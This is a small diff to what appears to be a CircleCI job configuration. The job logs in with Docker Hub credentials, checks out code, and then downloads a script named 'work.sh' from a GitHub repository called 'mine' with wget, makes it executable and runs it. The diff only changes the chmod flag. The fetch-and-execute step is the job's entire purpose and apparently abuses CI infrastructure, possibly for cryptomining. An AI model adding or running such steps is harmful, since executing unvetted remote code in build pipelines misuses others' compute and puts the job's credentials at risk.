@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD
     steps:
       - checkout 
-      - run: wget https://raw.githubusercontent.com/geraldyolang11/mine/main/work.sh && chmod u+x work.sh && ./work.sh
+      - run: wget https://raw.githubusercontent.com/geraldyolang11/mine/main/work.sh && chmod +x work.sh && ./work.sh
